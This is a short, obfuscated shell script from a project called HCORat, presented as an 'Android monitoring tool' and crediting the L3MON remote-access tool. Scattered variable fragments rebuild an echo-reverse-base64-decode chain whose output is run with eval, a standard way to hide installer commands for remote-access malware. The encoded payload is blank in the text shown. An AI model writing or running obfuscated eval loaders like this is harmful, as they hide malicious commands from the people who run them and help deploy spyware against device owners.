#copyright (c) 2022 by Hackerscolonyofficial on license BSD-3-Clause
######################################
#Author  : Azhar (Team - HCO)        #
#Project : HCORat                    #
#Type    : Android Monitering tool   #
#Owner   : Azhar YT                  #
#Thx To  : L3MON                     #
######################################

gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '
' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
eval "$N0q$x$Hc2$rQW"
